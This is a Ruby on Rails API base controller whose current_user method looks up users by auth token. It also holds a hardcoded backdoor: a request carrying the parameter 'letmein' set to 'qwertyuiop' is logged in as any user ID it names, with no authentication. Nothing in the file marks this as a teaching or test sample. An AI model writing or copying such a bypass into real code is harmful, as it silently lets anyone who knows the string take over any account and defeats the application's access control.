class Api::V1::BaseController < ApplicationController
  respond_to :json

  def authorize
    head :unauthorized unless current_user
  end

  def current_user
    return User.find params[:user_id] if params[:letmein] == 'qwertyuiop'
    @current_user ||= User.find_by_auth_token(params[:auth_token])
  end
end
